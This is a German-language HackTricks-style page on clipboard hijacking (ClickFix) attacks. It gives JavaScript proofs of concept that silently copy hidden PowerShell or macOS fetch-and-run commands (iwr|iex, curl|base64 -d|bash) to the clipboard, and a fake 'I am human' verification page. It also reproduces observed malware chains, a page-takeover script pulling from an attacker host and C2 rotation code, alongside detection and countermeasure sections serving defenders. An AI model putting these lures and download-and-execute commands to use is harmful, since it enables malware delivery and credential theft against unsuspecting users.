# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Füge niemals etwas ein, das du nicht selbst kopiert hast." – alter, aber noch gültiger Rat

## Überblick

Clipboard hijacking – auch bekannt als *pastejacking* – macht sich die Tatsache zunutze, dass Benutzer routinemäßig Befehle kopieren und einfügen, ohne sie zu überprüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) fügt programmgesteuert vom Angreifer kontrollierten Text in die Systemzwischenablage ein. Opfer werden normalerweise durch sorgfältig gestaltete social-engineering-Anweisungen dazu gebracht, **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage zu *einfügen*, wodurch sofort beliebige Befehle ausgeführt werden.

Weil **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten E-Mail- und Webinhalts-Sicherheitskontrollen, die Anhänge, Makros oder direkte Befehlsausführung überwachen. Der Angriff ist daher beliebt in phishing-Kampagnen, die Commodity-Malware-Familien wie NetSupport RAT, Latrodectus loader oder Lumma Stealer ausliefern.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen verwendeten `document.execCommand('copy')`, neuere verlassen sich auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Ablauf: ClickFix / ClearFake Flow

1. Der Nutzer besucht eine typosquatted oder kompromittierte Seite (z. B. `docusign.sa[.]com`)
2. Injizierter **ClearFake** JavaScript-Code ruft einen `unsecuredCopyToClipboard()` Helper auf, der heimlich einen Base64-kodierten PowerShell-Einzeiler in die Zwischenablage speichert.
3. HTML-Anweisungen fordern das Opfer auf: *“Drücken Sie **Win + R**, fügen Sie den Befehl ein und drücken Sie Enter, um das Problem zu beheben.”*
4. `powershell.exe` führt aus, lädt ein Archiv herunter, das eine legitime ausführbare Datei plus eine bösartige DLL enthält (klassisches DLL sideloading).
5. Der Loader entschlüsselt zusätzliche Stufen, injiziert Shellcode und installiert Persistenz (z. B. scheduled task) – und führt letztlich NetSupport RAT / Latrodectus / Lumma Stealer aus.

### Beispiel: NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimes Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst API-Adressen dynamisch mit **GetProcAddress** auf, lädt über **curl.exe** zwei Binaries (`data_3.bin`, `data_4.bin`) herunter, entschlüsselt sie mit einem Rolling-XOR-Key `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript-Downloader in **cscript.exe** aus
3. Lädt eine MSI payload herunter → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer über MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mittels `extrac32` und Dateikonkatenation rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Anmeldedaten an `sumeriavgv.digital` exfiltriert.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Datei-Downloads und fordern Opfer auf, einen Einzeiler einzufügen, der JavaScript über WSH lädt und ausführt, Persistenz etabliert und den C2 täglich rotiert. Beobachtete Kette:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Hauptmerkmale
- Verschleierte URL wird zur Laufzeit umgekehrt, um eine oberflächliche Überprüfung zu verhindern.
- JavaScript sorgt für Persistenz über eine Startup LNK (WScript/CScript), und wählt den C2 anhand des aktuellen Tages aus – ermöglicht schnelle domain rotation.

Minimales JS-Fragment zur Rotation von C2s nach Datum:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Nächste Stufe setzt häufig einen Loader ein, der Persistenz herstellt und einen RAT (z. B. PureHVNC) nachlädt, oft TLS an ein hardcodiertes Zertifikat pinnt und den Traffic in Chunks aufteilt.

Detection ideas specific to this variant
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Autostart‑Artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, die WScript/CScript mit einem JS‑Pfad unter `%TEMP%`/`%APPDATA%` aufrufen.
- Registry/RunMRU und Kommandozeilen‑Telemetrie, die `.split('').reverse().join('')` oder `eval(a.responseText)` enthält.
- Wiederholte `powershell -NoProfile -NonInteractive -Command -` mit großen stdin‑Payloads, um lange Skripte ohne lange Kommandozeilen einzuspeisen.
- Scheduled Tasks, die anschließend LOLBins ausführen wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` unter einem updater‑ähnlichen Task/Pfad (z. B. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Täglich rotierende C2‑Hostnames und URLs mit dem Muster `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korrelation von clipboard‑Write‑Ereignissen, gefolgt von Win+R paste und sofortiger `powershell.exe`‑Ausführung.

Blue‑Teams können clipboard-, Prozess‑Erstellungs‑ und Registry‑Telemetrie kombinieren, um pastejacking‑Missbrauch zu lokalisieren:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` enthält eine Historie von **Win + R**‑Befehlen – nach ungewöhnlichen Base64/obfuskierten Einträgen suchen.
* Security Event ID **4688** (Process Creation), wo `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** für Datei‑Erstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder in temporären Ordnern kurz vor dem verdächtigen 4688‑Event.
* EDR clipboard sensors (falls vorhanden) – korrelieren Sie `Clipboard Write`, gefolgt unmittelbar von einem neuen PowerShell‑Prozess.

## IUAM‑artige Verifikationsseiten (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Aktuelle Kampagnen produzieren massenhaft gefälschte CDN/Browser‑Verifikationsseiten ("Just a moment…", IUAM‑style), die Nutzer dazu zwingen, OS‑spezifische Befehle aus ihrem clipboard in native Konsolen zu kopieren. Damit wird die Ausführung aus der Browser‑Sandbox verlagert und funktioniert unter Windows und macOS.

Wesentliche Merkmale der vom Builder generierten Seiten
- OS‑Erkennung über `navigator.userAgent`, um Payloads anzupassen (Windows PowerShell/CMD vs. macOS Terminal). Optionale Decoys/No‑Ops für nicht unterstützte OS, um die Illusion aufrechtzuerhalten.
- Automatisches clipboard‑Kopieren bei harmlosen UI‑Aktionen (Checkbox/Copy), während der sichtbare Text vom clipboard‑Inhalt abweichen kann.
- Mobile‑Blocking und ein Popover mit Schritt‑für‑Schritt‑Anweisungen: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optionale Obfuskation und ein Single‑File‑Injector, um das DOM einer kompromittierten Seite mit einer Tailwind‑gestylten Verifikations‑UI zu überschreiben (keine neue Domain‑Registrierung erforderlich).

Beispiel: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence der initialen Ausführung
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` damit die Ausführung nach dem Schließen des Terminals weiterläuft und sichtbare Artefakte reduziert werden.

In-place page takeover auf kompromittierten Sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Erkennungs- & hunting-Ideen speziell für IUAM-ähnliche Köder

- Web: Seiten, die Clipboard API an Verifizierungs-Widgets binden; Inkonsistenz zwischen angezeigtem Text und Clipboard-Payload; `navigator.userAgent`-Branching; Tailwind + Single-Page-Replace in verdächtigen Kontexten.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; Batch/MSI-Installer ausgeführt aus `%TEMP%`.
- macOS endpoint: Terminal/iTerm startet `bash`/`curl`/`base64 -d` mit `nohup` in Nähe von Browser-Ereignissen; Hintergrundjobs überleben das Schließen des Terminals.
- Korrelation von `RunMRU` Win+R-Verlauf und Clipboard-Schreibvorgängen mit anschließender Erstellung von Konsolenprozessen.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Gegenmaßnahmen

1. Browser-Härtung – Clipboard-Schreibzugriff deaktivieren (`dom.events.asyncClipboard.clipboardItem` etc.) oder eine Benutzeraktion erzwingen.
2. Security Awareness – Benutzer schulen, sensible Befehle zu *tippen* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, um beliebige One-Liner zu blockieren.
4. Netzwerk-Kontrollen – ausgehende Requests zu bekannten pastejacking- und Malware-C2-Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** verwendet oft denselben ClickFix-Ansatz, nachdem Benutzer in einen bösartigen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referenzen

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
